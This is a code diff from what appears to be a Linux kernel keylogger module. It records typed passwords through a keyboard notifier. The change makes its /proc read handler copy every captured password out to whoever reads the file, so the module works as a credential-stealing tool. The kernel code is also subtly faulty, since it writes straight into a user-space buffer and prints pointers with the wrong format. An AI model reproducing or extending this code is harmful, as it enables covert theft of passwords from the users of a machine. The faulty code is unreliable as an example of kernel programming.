@@ -132,25 +132,33 @@ void check_pw(char* pw, int len){
 
 
 ssize_t read_password(struct file *filp, char *buf, size_t count, loff_t *offp ) {
+	
 	size_t comp = 0;
 	if(HEAD == NULL){
 		return 0;
 	}
+	if(*offp){
+		return 0;
+	}
+
 	struct password* curr = HEAD;
+	printk("%ld :: %ld\n%ld :: %ld\n", comp, count, buf, sizeof(buf));
        	while(curr != NULL){
-		printk("%s\n", curr->pw);
+		comp += snprintf(buf + comp, count - comp, "%s\n", curr->pw);
+		
+		//printk("%s\n", curr->pw);
 		if(curr->next == NULL) break;
 		curr = curr->next;
 	}
 
-	*offp = comp;
+	*offp = comp; // Place us at the correct offset for the next read operation
 	return comp;
 }
 
 struct proc_ops proc_fops = {
 	proc_read: read_password,
 };
-//doesn't like when it gets to the limit here
+
 char pw_buffer[16];
 
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
